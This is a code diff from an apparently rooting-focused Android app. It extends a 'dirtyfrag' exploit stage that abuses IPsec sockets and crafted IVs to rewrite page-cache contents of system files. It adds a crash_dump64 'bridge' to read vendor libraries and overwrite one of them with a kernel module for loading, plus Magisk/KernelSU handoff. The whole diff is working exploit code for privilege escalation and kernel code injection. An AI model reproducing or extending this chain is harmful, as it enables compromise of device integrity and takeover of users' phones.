@@ -1438,17 +1438,63 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         val lines = runCatching { marker.readLines() }.getOrDefault(emptyList())
             .map { it.trim() }.filter { it.isNotEmpty() }
         val bin = lines.firstOrNull { it.startsWith("/") } ?: "/data/local/tmp/magiskbin"
-        /* The module path may be the marker's second line (the bench stages it
-         * outside the app sandbox, where the root shell can read it), else a
-         * module.ko placed in the app's files dir (the bundled pairing). */
-        val module = lines.getOrNull(1)?.takeIf { it.startsWith("/") }
-            ?: File(filesDir, "module.ko").takeIf { it.isFile }?.absolutePath
         return buildMap {
             put("GHOSTLOCK_HANDOFF", "magisk")
             put("GHOSTLOCK_MAGISK_BIN", bin)
-            if (module != null) put("GHOSTLOCK_MODULE", module)
         }
     }
+
+    private val crashDumpPath = "/apex/com.android.runtime/bin/crash_dump64"
+    private val koTargets = listOf(
+        "/vendor/lib64/libbinderdebug.so",
+        "/vendor/lib64/libstagefrighthw.so",
+        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
+    )
+
+    /** One native stage invocation (aux-install or the full run). */
+    private suspend fun runStage(plan: File, mode: String, onLog: (String) -> Unit): Int {
+        val binary = File(appContext.applicationInfo.nativeLibraryDir, NativeBinaryName)
+        val command = ProcessBuilder(
+            binary.absolutePath,
+            "--dirtyfrag",
+            plan.absolutePath,
+            "--dirtyfrag-mode",
+            mode,
+        )
+            .directory(filesDir)
+            .redirectErrorStream(true)
+            .apply {
+                environment()["GHOSTLOCK_HOME"] = filesDir.absolutePath
+                environment()["TMPDIR"] = filesDir.absolutePath
+                environment()["HOME"] = filesDir.absolutePath
+                environment().putAll(handoffEnv())
+            }
+        val code = runProcess(command, onLog = onLog, captureOutput = true, timeoutSeconds = 120L)
+        onLog("<b> second way: dirtyfrag mode=$mode exited code=$code")
+        return code
+    }
+
+    /** A bridge read of a vendor_file target, after the aux-install run put the
+     * helper into crash_dump64's page cache. The exec runs in crash_dump. */
+    private suspend fun readBridge(len: Int, path: String, onLog: (String) -> Unit): ByteArray? =
+        withContext(Dispatchers.IO) {
+            runCatching {
+                val process = ProcessBuilder(crashDumpPath, "0", path, "r", len.toString())
+                    .redirectErrorStream(false)
+                    .start()
+                val data = ByteArray(len)
+                var read = 0
+                while (read < len) {
+                    val n = process.inputStream.read(data, read, len - read)
+                    if (n <= 0) break
+                    read += n
+                }
+                process.waitFor()
+                if (read == len) data else null
+            }.onFailure {
+                onLog("<-> bridge read: ${it::class.simpleName}: ${it.message}")
+            }.getOrNull()
+        }
 
     private suspend fun runDirtyfragStage(onLog: (String) -> Unit, debugDir: String?): Int {
         val ipsec = appContext.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
@@ -1473,17 +1519,78 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
             val socketName = buildString {
                 repeat(8) { append(alphabet[random.nextInt(alphabet.length)]) }
             }
+            val lib = File("/system/lib64/libc++.so")
+            /* Module pipeline: the module goes into a vendor_file target through
+             * the crash_dump bridge, and the stub insmods that target. The W1
+             * pipelines keep the single direct plan (koTarget empty, no aux). */
+            val moduleFile = File(filesDir, "module.ko")
+            val moduleMode = BuildConfig.DEBUG && File(filesDir, "handoff.magisk").isFile &&
+                moduleFile.isFile
+            var koTarget: String? = null
+            var modulePadded: ByteArray? = null
+            var helper: ByteArray? = null
+            if (moduleMode) {
+                koTarget = koTargets.firstOrNull { File(it).exists() }
+                if (koTarget == null) {
+                    onLog("<-> second way: no vendor_file target for the module")
+                    return 1
+                }
+                helper = appContext.assets.open(DirtyfragPlan.BRIDGE_ASSET).use { it.readBytes() }
+                val raw = moduleFile.readBytes()
+                val len = ((raw.size + 15) / 16) * 16
+                modulePadded = ByteArray(len).also { raw.copyInto(it) }
+                val installPlan = DirtyfragPlan.build(
+                    appContext,
+                    lib,
+                    key,
+                    spiObj.spi,
+                    senderPort,
+                    encap.port,
+                    socketName,
+                    File(filesDir, "dirtyfrag.install.plan"),
+                    auxHost = File(crashDumpPath),
+                    auxHelper = helper,
+                )
+                val installCode = runStage(installPlan, "aux-install", onLog)
+                onLog("<k> second way: bridge install code=$installCode")
+                if (installCode != 0) return 1
+            }
+            var vendorEntries: List<Pair<Long, ByteArray>> = emptyList()
+            var vendorLen = 0
+            if (moduleMode) {
+                val target = koTarget!!
+                val len = modulePadded!!.size
+                val old = readBridge(len, target, onLog)
+                if (old == null) {
+                    onLog("<-> second way: bridge read of $target failed")
+                    return 1
+                }
+                vendorLen = len
+                vendorEntries = (0 until len step 16).map { off ->
+                    val current = old.copyOfRange(off, off + 16)
+                    val desired = modulePadded.copyOfRange(off, off + 16)
+                    off.toLong() to DirtyfragPlan.ivFor(key, current, desired)
+                }
+                onLog("<k> second way: module ${len} B -> $target (${vendorEntries.size} blocks)")
+            }
             val plan = DirtyfragPlan.build(
                 appContext,
-                File("/system/lib64/libc++.so"),
+                lib,
                 key,
                 spiObj.spi,
                 senderPort,
                 encap.port,
                 socketName,
                 File(filesDir, "dirtyfrag.plan"),
+                koTarget = koTarget ?: "",
+                auxHost = if (moduleMode) File(crashDumpPath) else null,
+                auxHelper = helper,
+                auxInstalled = moduleMode,
+                vendorPath = koTarget,
+                vendorLen = vendorLen,
+                vendorEntries = vendorEntries,
             )
-            onLog("<k> second way: plan ${plan.name} socket=@$socketName")
+            onLog("<k> second way: plan ${plan.name} socket=@$socketName module=${koTarget ?: "none"}")
             /* Test hook: a debug file selects the native diagnostic mode
              * (noshell / noscript); anything else, or no file, is the product
              * path. The root script reads the same file for "noinstrument". */
@@ -1495,25 +1602,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                 else -> "full"
             }
             onLog("<k> second way: mode=$dirtyfragMode")
-            val binary = File(appContext.applicationInfo.nativeLibraryDir, NativeBinaryName)
-            val command = ProcessBuilder(
-                binary.absolutePath,
-                "--dirtyfrag",
-                plan.absolutePath,
-                "--dirtyfrag-mode",
-                dirtyfragMode,
-            )
-                .directory(filesDir)
-                .redirectErrorStream(true)
-                .apply {
-                    environment()["GHOSTLOCK_HOME"] = filesDir.absolutePath
-                    environment()["TMPDIR"] = filesDir.absolutePath
-                    environment()["HOME"] = filesDir.absolutePath
-                    environment().putAll(handoffEnv())
-                }
-            val code = runProcess(command, onLog = onLog, captureOutput = true, timeoutSeconds = 120L)
-            onLog("<b> second way: dirtyfrag exited code=$code")
-            return code
+            return runStage(plan, dirtyfragMode, onLog)
         } finally {
             runCatching { transform.close() }
             runCatching { spiObj.close() }
@@ -1537,7 +1626,9 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
             /* Bench/product switch for the module pipeline: a Magisk handoff
              * marker plus a staged module.ko is the new chain (no W1); the
              * bundled (profile, module) pairing replaces this later. */
-            val moduleBench = BuildConfig.DEBUG && handoffEnv().containsKey("GHOSTLOCK_MODULE")
+            val moduleBench = BuildConfig.DEBUG &&
+                File(workDir, "handoff.magisk").isFile &&
+                File(workDir, "module.ko").isFile
             if (!moduleBench && !stageKsud(workDir, onLog)) return 1
             // U01-S14: a per-run KernelSU log path so a previous run's markers
             // can never satisfy the handoff probe; passed to the native process.
